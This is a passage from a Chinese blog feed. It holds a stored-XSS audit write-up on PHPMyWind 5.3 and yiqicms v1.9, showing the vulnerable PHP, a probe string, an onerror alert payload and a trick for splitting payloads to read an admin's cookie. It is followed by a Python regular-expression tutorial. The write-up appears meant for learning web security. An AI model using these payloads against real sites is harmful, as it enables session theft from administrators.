class="string">'ondblclick'</span>, <span class="string">'ondeactivate'</span>, <span class="string">'ondrag'</span>, <span class="string">'ondragend'</span>, <span class="string">'ondragenter'</span>, <span class="string">'ondragleave'</span>, <span class="string">'ondragover'</span>, <span class="string">'ondragstart'</span>, <span class="string">'ondrop'</span>, <span class="string">'onerror'</span>, <span class="string">'onerrorupdate'</span>, <span class="string">'onfilterchange'</span>, <span class="string">'onfinish'</span>, <span class="string">'onfocus'</span>, <span class="string">'onfocusin'</span>, <span class="string">'onfocusout'</span>, <span class="string">'onhelp'</span>, <span class="string">'onkeydown'</span>, <span class="string">'onkeypress'</span>, <span class="string">'onkeyup'</span>, <span class="string">'onlayoutcomplete'</span>, <span class="string">'onload'</span>, <span class="string">'onlosecapture'</span>, <span class="string">'onmousedown'</span>, <span class="string">'onmouseenter'</span>, <span class="string">'onmouseleave'</span>, <span class="string">'onmousemove'</span>, <span class="string">'onmouseout'</span>, <span class="string">'onmouseover'</span>, <span class="string">'onmouseup'</span>, <span class="string">'onmousewheel'</span>, <span class="string">'onmove'</span>, <span class="string">'onmoveend'</span>, <span class="string">'onmovestart'</span>, <span class="string">'onpaste'</span>, <span class="string">'onpropertychange'</span>, <span class="string">'onreadystatechange'</span>, <span class="string">'onreset'</span>, <span class="string">'onresize'</span>, <span class="string">'onresizeend'</span>, <span class="string">'onresizestart'</span>, <span class="string">'onrowenter'</span>, <span class="string">'onrowexit'</span>, <span class="string">'onrowsdelete'</span>, <span class="string">'onrowsinserted'</span>, <span class="string">'onscroll'</span>, <span class="string">'onselect'</span>, <span class="string">'onselectionchange'</span>, <span class="string">'onselectstart'</span>, <span class="string">'onstart'</span>, <span class="string">'onstop'</span>, <span class="string">'onsubmit'</span>, <span class="string">'onunload'</span>);</span><br><span class="line">   $ra = array_merge($ra1, $ra2);</span><br><span class="line"></span><br><span class="line">   $found = <span class="keyword">true</span>; </span><br><span class="line">   <span class="keyword">while</span> ($found == <span class="keyword">true</span>) &#123;</span><br><span class="line">      $val_before = $val;</span><br><span class="line">      <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; sizeof($ra); $i++) &#123;</span><br><span class="line">         $pattern = <span class="string">'/'</span>;</span><br><span class="line">         <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; strlen($ra[$i]); $j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($j &gt; <span class="number">0</span>) &#123;</span><br><span class="line">               $pattern .= <span class="string">'('</span>;</span><br><span class="line">               $pattern .= <span class="string">'(&amp;#[xX]0&#123;0,8&#125;([9ab]);)'</span>;</span><br><span class="line">               $pattern .= <span class="string">'|'</span>;</span><br><span class="line">               $pattern .= <span class="string">'|(&amp;#0&#123;0,8&#125;([9|10|13]);)'</span>;</span><br><span class="line">               $pattern .= <span class="string">')*'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $pattern .= $ra[$i][$j];</span><br><span class="line">         &#125;</span><br><span class="line">         $pattern .= <span class="string">'/i'</span>;</span><br><span class="line">         $replacement = substr($ra[$i], <span class="number">0</span>, <span class="number">2</span>).<span class="string">'&lt;x&gt;'</span>.substr($ra[$i], <span class="number">2</span>);</span><br><span class="line">         $val = preg_replace($pattern, $replacement, $val); </span><br><span class="line">         <span class="keyword">if</span> ($val_before == $val) &#123;</span><br><span class="line">            $found = <span class="keyword">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> $val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-2-PHPMyWind-5-3"><a href="#1-2-PHPMyWind-5-3" class="headerlink" title="1.2 PHPMyWind_5.3"></a>1.2 PHPMyWind_5.3</h3><ul><li><p>下载地址：</p><p>  链接：<a href="https://pan.baidu.com/s/1ujXDwr4KOcd1iwbtJlnhEg" target="_blank" rel="noopener">https://pan.baidu.com/s/1ujXDwr4KOcd1iwbtJlnhEg</a><br>  提取码：3n1n</p></li><li><p>采用字符串<font size=4 color=#FF0000>6666”;!–’<XSS>=&amp;{()}&lt;&gt;6666</font>`作为简洁探测XSS注入点。注入后查看页面源代码并且寻找是否存在<code>666&amp;quot;</code>等字样来确认是否存在漏洞</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss10.png" alt=""></p><ul><li>后台查看留言模块，对留言进行修改</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss11.png" alt=""></p><ul><li>审查留言，右键点击框架源代码，并搜索6666查看输入位置，并分析</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss12.png" alt=""></p><pre><code>分析：过滤了双引号，左右尖括号</code></pre><ul><li><p>查看本地文件，(message.php)，找到如下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$contact  = htmlspecialchars($contact);</span><br><span class="line">$content  = htmlspecialchars($content);</span><br></pre></td></tr></table></figure><p>分析：可知对输入内容利用<font color=#FF0000 size=4>htmlspecialchars</font>进行了HTML实体转换</p></li><li><p>跟进content参数。PHPMyWind_5.3/admin/message_update.php</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;修改留言&lt;/title&gt;</span><br><span class="line">&lt;link href=<span class="string">"templates/style/admin.css"</span> rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> /&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"templates/js/jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"templates/js/checkf.func.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"editor/kindeditor-min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"editor/lang/zh_CN.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$row = $dosql-&gt;GetOne(<span class="string">"SELECT * FROM `#@__message` WHERE `id`=$id"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div class="formHeader"&gt; &lt;span class="title"&gt;修改留言&lt;/span&gt; &lt;a href="javascript:location.reload();" class="reload"&gt;刷新&lt;/a&gt; &lt;/div&gt;</span><br><span class="line">&lt;form name=<span class="string">"form"</span> id=<span class="string">"form"</span> method=<span class="string">"post"</span> action=<span class="string">"message_save.php"</span>&gt;</span><br><span class="line">    &lt;table width="100%" border="0" cellspacing="0" cellpadding="0" class="formTable"&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td width=<span class="string">"25%"</span> height=<span class="string">"40"</span> align=<span class="string">"right"</span>&gt;用户名：&lt;/td&gt;</span><br><span class="line">            &lt;td width=<span class="string">"75%"</span>&gt;&lt;strong&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row[<span class="string">'nickname'</span>] <span class="meta">?&gt;</span>&lt;/strong&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td height=<span class="string">"40"</span> align=<span class="string">"right"</span>&gt;联系方式：&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;input type="text" name="contact" id="contact" class="input" value="&lt;?php echo $row['contact'] ?&gt;" /&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td height=<span class="string">"198"</span> align=<span class="string">"right"</span>&gt;留言内容：&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;textarea name=<span class="string">"content"</span> id=<span class="string">"content"</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row[<span class="string">'content'</span>] <span class="meta">?&gt;</span>&lt;/textarea&gt;</span><br><span class="line">                &lt;script&gt;</span><br></pre></td></tr></table></figure><ul><li><p>这行代码<code>&lt;td&gt;&lt;textarea name=&quot;content&quot; id=&quot;content&quot;&gt;&lt;?php echo $row[&#39;content&#39;] ?&gt;&lt;/textarea&gt;</code>后台直接取出content参数,数据并未进行转义操作。<br>PHPMyWind_5.3/shoppingcart.php 留言板地址<br>以ing开头(可以是其他)</p></li><li><p>构造XSS payload：<code>&quot;&gt;&lt;img src=x onerror=alert(2001)&gt;&lt;&quot;</code>也即注入留言内容中</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss15.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss14.png" alt=""></p><h3 id="1-3-yiqicms-v1-9-20150904"><a href="#1-3-yiqicms-v1-9-20150904" class="headerlink" title="1.3 yiqicms-v1.9-20150904"></a>1.3 yiqicms-v1.9-20150904</h3><ul><li><p>下载链接</p><p>  链接：<a href="https://pan.baidu.com/s/1yGBVYMzt8SSXLum2ykcEaA" target="_blank" rel="noopener">https://pan.baidu.com/s/1yGBVYMzt8SSXLum2ykcEaA</a><br>提取码：4q0a </p></li></ul><ul><li>前期XSS注入点探测省略，直接对留言标题进行XSS payload提交</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss16.png" alt=""></p><ul><li>后台查看在线留言列表，弹出1,留言详情查看也会弹出1，F12审查元素</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss17.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss18.png" alt=""></p><ul><li><p>但是在利用的过程中如果是弹出cookie的话，发现有长度限制，尝试是否可以通过多次提交，使用/    /的方式绕过。</p><ul><li>第一次提交：<img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss19.png" alt=""></li><li>第二次提交：<img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss20.png" alt=""></li></ul></li><li><p>查看留言列表，成功弹窗cookie信息，F12审查元素</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss21.png" alt=""></p><ul><li><p>综上更多的利用方式，亦可以在一定长度下进行多次提交，巧妙利用注释</p></li><li><p>审查comment.php,对输入信息仅进行了长度限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/^.&#123;1,30&#125;$/"</span>,$msgtitle))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">"请输入正确的标题"</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^.&#123;1,10&#125;$/"</span>,$msgname))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">"请输入您的姓名"</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^.&#123;1,20&#125;$/"</span>,$msgcontact))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">"请输入正确的联系方式"</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^.&#123;1,200&#125;$/"</span>,$msgcontent))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">"请输入正确的留言内容"</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $msgcontent = safeCheck($msgcontent);</span><br><span class="line"></span><br><span class="line">    $userip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];;</span><br><span class="line">    $sql = <span class="string">"INSERT INTO yiqi_comments (cid ,title ,name,contact,content,ip,adddate)"</span> . <span class="string">"VALUES (NULL, '$msgtitle', '$msgname', '$msgcontact','$msgcontent', '$userip', null)"</span>;</span><br><span class="line">    $result = $yiqi_db-&gt;query(CheckSql($sql));</span><br></pre></td></tr></table></figure></li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://github.com/SecWiki/CMS-Hunter/tree/master/DedeCMS/DedeCMS_v5.7_carbuyaction_%E5%AD%98%E5%82%A8%E5%9E%8BXSS" target="_blank" rel="noopener">https://github.com/SecWiki/CMS-Hunter/tree/master/DedeCMS/DedeCMS_v5.7_carbuyaction_%E5%AD%98%E5%82%A8%E5%9E%8BXSS</a></li><li><a href="https://www.seebug.org/vuldb/ssvid-89295" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-89295</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【python-正则】1.2Python正则表达式学习-2</title>
      <link href="2020/04/14/1.2%20Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0-2/"/>
      <url>2020/04/14/1.2%20Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0-2/</url>
      
        <content type="html"><![CDATA[<p>本文主要是对Python正则相关知识，进行简单的梳理</p><a id="more"></a><h2 id="0x01-正则表达式语法"><a href="#0x01-正则表达式语法" class="headerlink" title="0x01 正则表达式语法"></a>0x01 正则表达式语法</h2><h3 id="1-1-字符与字符类"><a href="#1-1-字符与字符类" class="headerlink" title="1.1 字符与字符类"></a>1.1 字符与字符类</h3><p>1.特殊字符：<font color=    #FF0000 size =5>\.^$?+*{}[]()|</font></p><p>以上特殊字符要表示字面值，必须使用<font color=#FF0000>\</font>进行转义</p><p>2.字符类 </p><ul><li>包含在<font color=#FF0000 size=4>[]</font>中的一个或者多个字符被称为字符类，字符类在匹配时如果没有指定量词则只会匹配其中的一个。</li><li>字符类内可以指定范围，比如<font color=#FF0000 size=4>[a-zA-Z0-9]</font>表示a到z，A到Z，0到9之间的任何一个字符</li><li>左方括号后跟随一个<font color=#FF0000 size=4>^</font>，表示否定一个字符类，比如<font color=#FF0000 size=4>[^0-9]</font>表示可以匹配一个任意非数字的字符。</li><li>字符类内部，除了<font color=#FF0000 size=4>\</font>之外，其他特殊字符不再具备特殊意义，都表示字面值。<font color=#FF0000 size=4>^</font>放在第一个位置表示否定，放在其他位置表示<font color=#FF0000 size=4>^</font>本身，<font color=#FF0000 size=4>-</font>放在中间表示范围，放在字符类中的第一个字符，则表示<font color=#FF0000 size=4>-</font>本身。</li><li>字符类内部可以使用速记法，比如<font color=#FF0000 size=4>\d \s \w</font></li></ul><p>3.速记法</p><ul><li><font color=#FF0000 size=4>.</font> 可以匹配除换行符之外的任何字符，如果有re.DOTALL标志，则匹配任意字符包括换行</li><li><font color=#FF0000 size=4>\d</font>匹配一个Unicode数字，如果带re.ASCII，则匹配0-9</li><li><font color=#FF0000 size=4>\D</font>匹配Unicode非数字</li><li><font color=#FF0000 size=4>\s</font> 匹配Unicode空白，如果带有re.ASCII，则匹配<font color=#FF0000 size=4>\t\n\r\f\v</font>中的一个</li><li><font color=#FF0000 size=4>\S</font> 匹配Unicode非空白</li><li><font color=#FF0000 size=4>\w</font>匹配Unicode单词字符，如果带有re.ascii,则匹配<font color=#FF0000 size=4>[a-zA-Z0-9_]</font>中的一个</li><li><font color=#FF0000 size=4>\W</font>匹配Unicode非单词字符</li></ul><h3 id="1-2-量词"><a href="#1-2-量词" class="headerlink" title="1.2 量词"></a>1.2 量词</h3><ul><li><font color=#FF0000 size=4>?</font>  匹配前面的字符0次或1次</li><li><font color=#FF0000 size=4>*</font>  匹配前面的字符0次或多次</li><li><font color=#FF0000 size=4>+</font>  匹配前面的字符1次或者多次</li><li><font color=#FF0000 size=4>{m}</font> 匹配前面表达式m次</li><li><font color=#FF0000 size=4>{m,}</font>  匹配前面表达式至少m次</li><li><font color=#FF0000 size=4>{,n}</font> 匹配前面的正则表达式最多n次</li><li><font color=#FF0000 size=4>{m,n}</font> 匹配前面的正则表达式至少m次，最多n次</li></ul><p>注意点：<br>以上量词都是贪婪模式，会尽可能多的匹配，如果要改为非贪婪模式，通过在量词后面跟随一个<font color=#FF0000 size=4>?</font>来实现</p><h3 id="1-3-组与捕获"><a href="#1-3-组与捕获" class="headerlink" title="1.3 组与捕获"></a>1.3 组与捕获</h3><p>1.<font color=#FF0000 size=4>()</font>的作用</p><ul><li><p>捕获<font color=#FF0000 size=4>()</font>中正则表达式内容以备进一步利用处理，可以通过在左括号后面跟随<font color=#FF0000 size=4>?:</font>来关闭括号的捕获功能</p></li><li><p>将正则表达式的一部分内容进行组合，方便使用量词或者|</p></li></ul><p>2.反向引用前面<font color=#FF0000 size=4>()</font>内捕获的内容</p><ul><li><p>通过组号反向引用</p><p> 每一个没有使用<font color=#FF0000 size=4>?:</font>的小括号都会分配一个组好，从1开始，从左到右递增，可以通过<font color=#FF0000 size=4>\i</font>引用前面<font color=#FF0000 size=4>()</font>内表达式捕获的内容</p></li><li><p>通过组名反向引用前面小括号内捕获的内容</p><p>  可以通过在左括号后面跟随<code>?P&lt;name&gt;</code>,尖括号中放入组名来为一个组起一个别名，后面通过<code>(?P=name)</code>来引用 前面捕获的内容。如<code>(?P&lt;word&gt;\w+)\s+(?P=word)</code>来匹配重复的单词。</p></li></ul><p>注意点：<br>反向引用不能放在字符类<font color=#FF0000 size=4>[]</font>中使用</p><h3 id="1-4-断言与标记"><a href="#1-4-断言与标记" class="headerlink" title="1.4 断言与标记"></a>1.4 断言与标记</h3><p>断言不会匹配任何文本，只是对断言所在的文本施加某些约束</p><p>1.常用断言</p><ul><li><font color=#FF0000 size=4>\b</font> 匹配单词的边界，放在字符类[]中则表示backspace</li><li><font color=#FF0000 size=4>\B</font> 匹配非单词边界，受ASCII标记影响</li><li><font color=#FF0000 size=4>\A</font> 在起始处匹配</li><li><font color=#FF0000 size=4>^</font> 在起始处匹配，如果有MULTILINE标志，则在每个换行符后匹配</li><li><font color=#FF0000 size=4>\Z</font> 在结尾处匹配</li><li><font color=#FF0000 size=4>$</font>在结尾处匹配，如果有MULTILINE标志，则在每个换行符前匹配</li><li><font color=#FF0000 size=4>(?=e)</font> 正前瞻</li><li><font color=#FF0000 size=4>(?!e)</font> 负前瞻</li><li><font color=#FF0000 size=4>(?&lt;=e)</font> 正回顾</li><li><font color=#FF0000 size=4>(?&lt;!e)</font>负回顾</li></ul><p>2.前瞻回顾的解释</p><ul><li>前瞻： <font color=#FF0000 size=4>exp1(?=exp2)</font> exp1后面的内容要匹配exp2</li><li>负前瞻: <font color=#FF0000 size=4>exp1(?!exp2)</font> exp1后面的内容不能匹配exp2</li><li>后顾: <font color=#FF0000 size=4>(?&lt;=exp2)exp1</font> exp1前面的内容要匹配exp2</li><li>负后顾: <font color=#FF0000 size=4>(?&lt;!exp2)exp1</font> exp1前面的内容不能匹配exp2</li></ul><p>例如：我们要查找hello，但是hello后面必须是world，正则表达式可以这样写：”(hello)\s+(?=world)”,用来匹配”hello wangxing”和”hello world”只能匹配到后者的hello</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">re.match(<span class="string">"(hello)\s+(?=world)"</span>,<span class="string">"hello world"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>&apos;hello &apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(<span class="string">"(hello)\s+(?=world)"</span>,<span class="string">"hello dd"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-5-07f0304e6ee4&gt; in &lt;module&gt;----&gt; 1 re.match(&quot;(hello)\s+(?=world)&quot;,&quot;hello dd&quot;).group()AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><h3 id="1-5-条件匹配"><a href="#1-5-条件匹配" class="headerlink" title="1.5 条件匹配"></a>1.5 条件匹配</h3><p><font color=#FF0000 size=4>(?(id)yes_exp|no_exp)</font> 对应id的子表达式如果匹配到内容，则这里匹配yes_exp，否则匹配no_exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(<span class="string">r"(123)qwe(?(1)456|789)"</span>, <span class="string">"123qwe456"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>&apos;123qwe456&apos;</code></pre><h3 id="1-6-正则表达式的标志"><a href="#1-6-正则表达式的标志" class="headerlink" title="1.6 正则表达式的标志"></a>1.6 正则表达式的标志</h3><ul><li><p>正则表达式的标志有两种使用方法</p><ul><li>通过给compile方法传入标志参数，多个标志使用|分割的方法,如<font color=#FF0000 size=4>re.compile(r”#[\da-f]{6}\b”, re.IGNORECASE|re.MULTILINE)</font></li><li>通过在正则表达式前面添加(?标志)的方法给正则表达式添加标志，如<font color=#FF0000 size=4>(?ms)#[\da-z]{6}\b</font></li></ul></li><li><p>常用的标志</p><ul><li>re.A或者re.ASCII， 使\b \B \s \S \w \W \d \D都假定字符串为假定字符串为ASCII</li><li>re.I或者re.IGNORECASE 使正则表达式忽略大小写</li><li>re.M或者re.MULTILINE 多行匹配，使每个^在每个回车后，每个$在每个回车前匹配</li><li>re.S或者re.DOTALL 使.能匹配任意字符，包括回车</li><li>re.X或者re.VERBOSE 这样可以在正则表达式跨越多行，也可以添加注释，但是空白需要使用\s,或者[ ]来表示，因为默认的空白不再解释。如：</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">charref = re.compile(<span class="string">r"""</span></span><br><span class="line"><span class="string"> &amp;[#]                # Start of a numeric entity reference</span></span><br><span class="line"><span class="string"> (</span></span><br><span class="line"><span class="string">     0[0-7]+         # Octal form</span></span><br><span class="line"><span class="string">   | [0-9]+          # Decimal form</span></span><br><span class="line"><span class="string">   | x[0-9a-fA-F]+   # Hexadecimal form</span></span><br><span class="line"><span class="string"> )</span></span><br><span class="line"><span class="string"> ;                   # Trailing semicolon</span></span><br><span class="line"><span class="string">"""</span>, re.VERBOSE)</span><br></pre></td></tr></table></figure><h2 id="0x02-Python正则表达式模块"><a href="#0x02-Python正则表达式模块" class="headerlink" title="0x02 Python正则表达式模块"></a>0x02 Python正则表达式模块</h2><h3 id="2-1-正则表达式处理字符串主要四大功能"><a href="#2-1-正则表达式处理字符串主要四大功能" class="headerlink" title="2.1 正则表达式处理字符串主要四大功能"></a>2.1 正则表达式处理字符串主要四大功能</h3><ul><li>匹配：查看一个字符串是否符合正则表达式的语法，一般返回true或者false</li><li>获取： 正则表达式来提取字符串中符合要求的文本</li><li>替换 查找字符串中符合正则表达式的文本，并用相应的字符串替换</li><li>分割 使用正则表达式对字符串进行分割。</li></ul><h3 id="2-2-Python中re模块使用正则表达式的两种方法"><a href="#2-2-Python中re模块使用正则表达式的两种方法" class="headerlink" title="2.2 Python中re模块使用正则表达式的两种方法"></a>2.2 Python中re模块使用正则表达式的两种方法</h3><ul><li>使用re.compile(r, f)方法生成正则表达式对象，然后调用正则表达式对象的相应方法。这种做法的好处是生成正则对象之后可以多次使用。</li><li>re模块中对正则表达式对象的每个对象方法都有一个对应的模块方法，唯一不同的是传入的第一个参数是正则表达式字符串。此种方法适合于只使用一次的正则表达式。</li></ul><h3 id="2-3-正则表达式对象的常用方法"><a href="#2-3-正则表达式对象的常用方法" class="headerlink" title="2.3 正则表达式对象的常用方法"></a>2.3 正则表达式对象的常用方法</h3><ul><li><p><font color=#FF0000 size=4>rx.findall(s,start, end)</font></p><p>  返回一个列表，如果正则表达式中没有分组，则列表中包含的是所有匹配的内容，<br>如果正则表达式中有分组，则列表中的每个元素是一个元组，元组中包含子分组中匹配到的内容，但是没有返回整个正则表达式匹配的内容</p></li></ul><p>​    </p><ul><li><p><font color=#FF0000 size=4>rx.finditer(s, start, end)</font></p><p>  返回一个可迭代对象<br>对可迭代对象进行迭代，每一次返回一个匹配对象，可以调用匹配对象的group()方法查看指定组匹配到的内容，0表示整个正则表达式匹配到的内容</p></li><li><p><font color=#FF0000 size=4>rx.search(s, start, end)</font></p><p>  返回一个匹配对象,倘若没匹配到，就返回None</p><p>  search方法只匹配一次就停止，不会继续往后匹配</p></li><li><p><font color=#FF0000 size=4>rx.match(s, start, end)</font></p><p>  如果正则表达式在字符串的起始处匹配，就返回一个匹配对象，否则返回None</p></li><li><p><font color=#FF0000 size=4>rx.sub(x, s, m)</font></p><p>  返回一个字符串。每一个匹配的地方用x进行替换，返回替换后的字符串，如果指定m，则最多替换m次。对于x可以使用/i或者/g<id>id可以是组名或者编号来引用捕获到的内容。</p><p>  模块方法re.sub(r, x, s, m)中的x可以使用一个函数。此时我们就可以对捕获到的内容推过这个函数进行处理后再替换匹配到的文本。</p></li></ul><ul><li><p><font color=#FF0000 size=4>rx.subn(x, s, m)</font></p><p>  与re.sub()方法相同，区别在于返回的是二元组，其中一项是结果字符串，一项是做替换的个数。</p></li><li><p><font color=#FF0000 size=4>rx.split(s, m)</font></p><p>  分割字符串,返回一个列表，用正则表达式匹配到的内容对字符串进行分割<br>  如果正则表达式中存在分组，则把分组匹配到的内容放在列表中每两个分割的中间作为列表的一部分，如：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rx = re.compile(<span class="string">r"(\d)[a-z]+(\d)"</span>)</span><br><span class="line">s = <span class="string">"ab12dk3klj8jk9jks5"</span></span><br><span class="line">result = rx.split(s)</span><br><span class="line">result</span><br></pre></td></tr></table></figure><pre><code>[&apos;ab1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;klj&apos;, &apos;8&apos;, &apos;9&apos;, &apos;jks5&apos;]</code></pre><ul><li><p><font color=#FF0000 size=4>rx.flags()</font></p><p>  正则表达式编译时设置的标志</p></li><li><p><font color=#FF0000 size=4>rx.pattern()</font></p><p>  正则表达式编译时使用的字符串</p></li></ul><h3 id="2-4-匹配对象的属性与方法"><a href="#2-4-匹配对象的属性与方法" class="headerlink" title="2.4 匹配对象的属性与方法"></a>2.4 匹配对象的属性与方法</h3><ul><li><p><font color=#FF0000 size=4>m.group(g, …)</font></p><p>  返回编号或者组名匹配到的内容，默认或者0表示整个表达式匹配到的内容，如果指定多个，就返回一个元组</p></li><li><p><font color=#FF0000 size=4>m.groupdict(default)</font></p><p>  返回一个字典。字典的键是所有命名的组的组名，值为命名组捕获到的内容<br>  如果有default参数，则将其作为那些没有参与匹配的组的默认值。</p></li><li><p><font color=#FF0000 size=4>m.groups(default)</font></p><p>  返回一个元组。包含所有捕获到内容的子分组，从1开始，如果指定了default值，则这个值作为那些没有捕获到内容的组的值</p></li><li><p><font color=#FF0000 size=4>m.lastgroup()</font></p><p>  匹配到内容的编号最高的捕获组的名称，如果没有或者没有使用名称则返回None(不常用)</p></li><li><p><font color=#FF0000 size=4>m.lastindex()</font></p><p>  匹配到内容的编号最高的捕获组的编号，如果没有就返回None</p></li><li><p><font color=#FF0000 size=4>m.start(g)</font></p><p>  当前匹配对象的子分组是从字符串的那个位置开始匹配的,如果当前组没有参与匹配就返回-1</p></li><li><p><font color=#FF0000 size=4>m.end(g)</font></p><p>  当前匹配对象的子分组是从字符串的那个位置匹配结束的，如果当前组没有参与匹配就返回-1</p></li><li><p><font color=#FF0000 size=4>m.span()</font></p><p>  